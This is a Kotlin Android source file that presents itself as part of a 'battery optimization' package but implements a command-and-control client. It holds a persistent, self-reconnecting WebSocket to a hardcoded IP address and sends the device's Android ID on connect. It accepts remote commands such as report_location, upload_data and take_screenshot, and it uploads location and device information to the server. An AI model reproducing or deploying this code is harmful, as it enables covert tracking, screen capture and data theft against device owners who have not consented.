package com.android.batteryoptimization.network

import android.annotation.SuppressLint
import android.content.Context
import android.util.Log
import com.android.batteryoptimization.DeviceInfoHelper
import com.google.gson.Gson
import com.google.gson.JsonObject
import okhttp3.*
import java.util.Timer
import java.util.TimerTask
import java.util.concurrent.TimeUnit

/**
 * WebSocket 管理器 — 与服务器保持长连接，接收下行指令。
 *
 * 功能：
 *  - 自动连接 / 断线重连
 *  - 心跳保活（30s 间隔）
 *  - 指令分发（report_location / upload_data / take_screenshot 等）
 */
@SuppressLint("StaticFieldLeak")
object WebSocketManager {

    private const val TAG = "WebSocket"
    private const val WS_URL = "ws://47.93.162.24/ws"
    private const val HEARTBEAT_INTERVAL_MS = 30000L
    private const val RECONNECT_DELAY_MS = 5000L

    private val gson = Gson()
    private var webSocket: WebSocket? = null
    private var httpClient: OkHttpClient? = null
    private var contextRef: Context? = null
    private var isActive = false
    private var heartbeatJob: java.util.Timer? = null

    /** 外部设置的回调 — 收到指令时触发 */
    var onCommand: ((command: String, params: JsonObject?) -> Unit)? = null

    // ─── 生命周期 ─────────────────────────────────────────────────────

    /** 启动 WebSocket 连接 */
    fun start(context: Context) {
        if (isActive) return
        isActive = true
        contextRef = context.applicationContext
        Log.d(TAG, "WebSocket starting...")
        connect()
    }

    /** 停止 WebSocket 连接 */
    fun stop() {
        isActive = false
        stopHeartbeat()
        webSocket?.close(1000, "Client closing")
        webSocket = null
        Log.d(TAG, "WebSocket stopped")
    }

    /** 发送数据到服务器 */
    fun send(data: String): Boolean {
        return webSocket?.send(data) ?: false
    }

    // ─── 内部实现 ─────────────────────────────────────────────────────

    private fun connect() {
        if (!isActive) return

        val client = httpClient ?: OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .pingInterval(HEARTBEAT_INTERVAL_MS, TimeUnit.MILLISECONDS)
            .build()
            .also { httpClient = it }

        val request = Request.Builder()
            .url(WS_URL)
            .build()

        client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                WebSocketManager.webSocket = webSocket
                Log.d(TAG, "WebSocket connected")
                startHeartbeat()
                // 连接成功后发送设备标识
                val ctx = contextRef ?: return@onOpen
                val androidId = android.provider.Settings.Secure.getString(ctx.contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "unknown"
                send("""{"type":"auth","deviceId":"$androidId"}""")
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                handleMessage(text)
            }

            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                Log.d(TAG, "WebSocket closing: $code $reason")
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                WebSocketManager.webSocket = null
                Log.d(TAG, "WebSocket closed: $code $reason")
                scheduleReconnect()
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "WebSocket failure: ${t.message}", t)
                WebSocketManager.webSocket = null
                scheduleReconnect()
            }
        })
    }

    private fun handleMessage(text: String) {
        try {
            val json = gson.fromJson(text, JsonObject::class.java) ?: return
            val type = json.get("type")?.asString ?: return

            when (type) {
                "pong" -> Log.v(TAG, "Heartbeat pong received")
                "command" -> {
                    val command = json.get("command")?.asString ?: return
                    val params = json.getAsJsonObject("params")
                    Log.d(TAG, "Command received: $command params=$params")
                    onCommand?.invoke(command, params)
                }
                else -> Log.d(TAG, "Unknown message type: $type")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to parse message: $text", e)
        }
    }

    // ─── 心跳 ─────────────────────────────────────────────────────────

    private fun startHeartbeat() {
        stopHeartbeat()
        heartbeatJob = Timer(true)
        heartbeatJob?.schedule(object : TimerTask() {
            override fun run() {
                if (isActive) {
                    val sent = send("""{"type":"ping"}""")
                    Log.v(TAG, "Heartbeat ping sent=$sent")
                }
            }
        }, HEARTBEAT_INTERVAL_MS, HEARTBEAT_INTERVAL_MS)
    }

    private fun stopHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = null
    }

    private fun scheduleReconnect() {
        if (!isActive) return
        Log.d(TAG, "Scheduling reconnect in ${RECONNECT_DELAY_MS}ms")
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            if (isActive) connect()
        }, RECONNECT_DELAY_MS)
    }

    // ─── 便捷发送 ─────────────────────────────────────────────────────

    /** 主动上报地理位置 */
    fun sendLocation(locationMap: Map<String, Any>) {
        val payload = gson.toJson(locationMap)
        send("""{"type":"location","data":$payload}""")
    }

    /** 主动上报设备信息 */
    fun sendDeviceInfo(context: Context) {
        val info = DeviceInfoHelper.getDeviceInfoJson(context)
        send("""{"type":"device_info","data":$info}""")
    }
}
